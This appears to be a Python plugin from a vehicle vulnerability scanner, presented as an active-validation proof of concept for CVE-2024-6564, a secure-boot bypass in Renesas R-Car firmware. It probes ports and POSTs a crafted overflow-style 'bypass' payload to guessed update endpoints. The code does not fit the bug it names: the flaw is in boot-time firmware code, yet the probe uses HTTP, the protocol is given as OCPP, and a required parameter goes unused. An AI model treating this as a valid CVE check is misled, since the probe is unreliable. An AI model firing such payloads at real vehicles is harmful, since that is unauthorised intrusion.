#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 48,
    "cve": "CVE-2024-6564",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Renesas R-Car / ARM TF-A",
    "component": "rcar_dev_init",
    "type": "缓冲区溢出/安全启动绕过",
    "summary": "使用未验证镜像编号作循环计数，可导致安全启动绕过。",
    "source_description": "Buffer overflow in \"rcar_dev_init\"  due to using due to using untrusted data (rcar_image_number) as a loop counter before verifying it against RCAR_MAX_BL3X_IMAGE. This could lead to a full bypass of secure boot.",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6564",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-6564",
        "https://github.com/renesas-rcar/arm-trusted-firmware/commit/c9fb3558410032d2660c7f3b7d4b87dec09fe2f2",
        "https://asrg.io/security-advisories/cve-2024-6564/",
        "https://cveawg.mitre.org/api/cve/CVE-2024-6564"
    ],
    "affected": [
        {
            "vendor": "Renesas",
            "product": "rcar_gen3_v2.5",
            "versions": [
                {
                    "version": "c2f286820471ed276c57e603762bd831873e5a17",
                    "status": "affected",
                    "lessThanOrEqual": "c9fb3558410032d2660c7f3b7d4b87dec09fe2f2",
                    "versionType": "git"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-6564",
        "Renesas",
        "R-Car",
        "ARM",
        "TF-A",
        "rcar_dev_init",
        "Buffer",
        "overflow",
        "using",
        "untrusted",
        "data",
        "rcar_image_number",
        "loop",
        "counter",
        "verifying",
        "against",
        "RCAR_MAX_BL3X_IMAGE",
        "could",
        "lead",
        "full",
        "bypass",
        "secure",
        "boot",
        "rcar_gen3_v2.5"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2024-6564: Renesas R-Car rcar_dev_init signature bypass via update endpoint."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 8080))
    tls = bool(params.get("tls", False))

    evidence = {
        "cve": "CVE-2024-6564",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - Renesas R-Car rcar_dev_init signature bypass via update endpoint",
    }

    active_port = None
    for try_port in [port, 80, 443, 8080, 9000]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    r_root = probe.get("/")
    evidence["http_status"] = r_root.get("status")
    evidence["server_header"] = r_root.get("headers", {}).get("Server", "")

    bypass_paths = ["/firmware/update", "/boot/update", "/rcar/update", "/secure_boot/bypass"]
    for path in bypass_paths:
        bypass_payload = b'{"image_number": 4294967295, "signature": "BYPASS_TEST"}'
        r = probe.post(path, bypass_payload, "application/json")
        status = r.get("status")
        evidence[f"bypass_{path.strip('/').replace('/', '_')}_status"] = status
        if status not in (401, 403, 404, None):
            evidence["bypass_endpoint_responsive"] = path
            evidence["bypass_body_preview"] = r.get("body_text", "")[:200]
            return {
                "vulnerable": None,
                "evidence": evidence,
                "detection_confidence": detection_confidence("B", evidence, "bypass_endpoint_probed"),
                "requires_manual_review": True,
            }

    evidence["bypass_paths_tested"] = bypass_paths
    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("C", evidence, "renesas_bypass_probe"),
        "requires_manual_review": True,
    }

class Poc41CVE20246564ExposureAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-041"
    meta_poc_name = 'CVE-2024-6564 安全启动绕过 Active Validation'
    meta_cve_id = 'CVE-2024-6564'
    meta_severity = 'High'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-6564'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-6564']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "41_Renesas_RCar_Secure_Boot_Bypass_Audit") if "VULN" in dir() else "41_Renesas_RCar_Secure_Boot_Bypass_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc41CVE20246564ExposureAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
